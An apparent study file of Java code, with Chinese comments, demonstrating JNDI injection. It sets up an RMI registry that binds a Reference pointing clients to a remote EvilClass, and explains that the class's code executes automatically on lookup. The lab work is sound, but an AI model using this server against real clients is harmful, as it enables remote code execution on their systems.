package com.example.study.rmi.jndiVulnerability;



import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.RefAddr;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * 运行前提
 * Java Compiler 添加编译参数【--add-modules=jdk.naming.rmi --add-exports=jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED】
 * VM Options 添加 【--add-exports jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED】
 * 或者在环境变量添加 【JAVA_TOOL_OPTIONS = --add-exports jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED】
 * 目的是引入 JNDI 相应模块，因为 Java9 开始 JDK 被分为多个模块，某些不常用模块需要被手动引入
 *
 * RMI 服务器【动态类加载】的【JNDI注入】测试
 * 注册一个真实数据（class 文件）的引用对象【Reference】到 registry
 * 引用对象包含 class 所在的外部静态服务器（nginx）地址，class 是否作为工厂类，class name 等信息
 * 客户端首先从 registry 获取引用对象，然后根据引用对象提供的信息区 nginx 获取 class 文件以实例化
 *
 * 由于服务器提供的 EvilClass 最终会被客户端从 nginx 拉取到客户端 JVM 并且实例化
 * 因此只要 EvilClass 在静态代码块或者 getObjectInstance 中注入恶意代码，即可被客户端自动执行
 *
 * 注意：
 * factory 要是【全类名】，因为 class 文件用全类名作为唯一标识符
 * 外部静态服务器需要暴露【factoryUrl + factroy】接口，即：【http://localhost/com/example/study/rmi/jndiVulnerability/evil/EvilClass.class】
 * 因为客户端会通过【【factoryUrl + factroy + .class】来获取 class 文件
 *
 */
public class RmiRegistry {
    public static void main(String args[]) {

        try {
            Registry registry = LocateRegistry.createRegistry(10099);
//            nginx地址，客户端最终会以【factoryUrl + factory 全类名】的方式查找 factory
//            http://localhost/com/example/study/rmi/jndiVulnerability/evil/EvilClass.class
            String factoryUrl = "http://localhost/";
//            指定工厂类【全类名】，以及工厂类【静态服务器地址】
            Reference reference = new Reference("jndi.RefClass","com.example.study.rmi.jndiVulnerability.evil.EvilClass", factoryUrl);

//            Reference reference = new Reference("jndi.RefClass");
//            Reference reference = new Reference("com.example.study.rmi.jndiVulnerability.evil.RefClass",
//                    new StringRefAddr("nginx","http://localhost"));
//            ReferenceWrapper是将 Reference 包装成一个 Remote 对象，因为只有 Remote 对象才能被注册
            ReferenceWrapper wrapper = new ReferenceWrapper(reference);
            registry.bind("Foo", wrapper);

            System.err.println("Server ready, factoryUrl:" + factoryUrl);
        } catch (Exception e) {
            System.err.println("Server exception: " + e.toString());
            e.printStackTrace();
        }
    }
}

